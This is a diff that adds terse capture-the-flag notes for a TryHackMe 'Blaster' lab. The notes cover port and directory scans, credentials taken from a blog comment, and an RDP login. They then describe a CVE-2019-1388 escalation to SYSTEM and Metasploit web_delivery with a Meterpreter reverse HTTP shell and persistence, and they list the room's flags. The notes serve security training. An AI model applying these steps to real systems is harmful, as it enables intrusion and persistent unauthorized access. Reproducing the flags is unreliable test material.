@@ -1,0 +1,60 @@
+[Blaster]
+[Task 1]
+
+
+[Task 2]
+[Activate Forward Scanners and Launch Proton Torpedoes ]
+
+[Nmap]
+80/tcp open  http    syn-ack Microsoft IIS httpd 10.0
+| http-methods:
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE    
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+[Gobuster]
+gobuster dir -u 10.10.239.121 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 40
+ 
+[User]
+http://10.10.239.121/retro/index.php/2019/12/09/ready-player-one/#comment-2
+user:wade
+pass:parzival
+/retro/wp-login.php
+#xfreerdp
+xfreerdp /u:wade /v:10.10.239.121 
+Flag:THM{HACK_PLAYER_ONE}
+
+[Task 3]
+Breaching the Control Room 
+cve-2019-1388
+Run the hhupd as administrator >> show info about the publisher's cert >> VeriSign Commercial Software Publishers CA
+---------------------------------------------------------------------------------------------------------------------
+https://www.verisign.com/repository/CPS
+Internet Explorer CTRL + S
+C:\Windows\System32
+C:\Windows\System32\cmd.exe
+C:\>whoami  
+#nt authority\system
+C:\Users\Administrator\Desktop
+C:\Users\Administrator\Desktop>more root.txt
+Root.txt:THM{COIN_OPERATED_EXPLOITATION}
+
+[Task 4]
+Adoptive into the collective
+Metasploit:'exploit/multi/script/web_delivery' 
+Which target number is PSH(PowerShell)?: 2
+--------------------------------------------------------
+Metasploit:'set payload windows/meterpreter/reverse_http
+Simple reverse HTTP Payload.
+python3 -m http.server
+-------------------------------------------------------------------------------------------------------
+Return to the terminal we spawned with our exploit. In this terminal, paste the command output by Metasploit after 
+the job was launched. In this case, I've found it particularly helpful to host a simple python web server 
+(python3 -m http.server) and host the command in a text file as copy and paste between the machines won't always work. 
+Once you've run this command, return to our attacker machine and note that our reverse shell has spawned. 
+-------------------------------------------------------------------------------------------------------
+Persistence Meterpreter
+run persistence -X
+---------------------------------------------------------
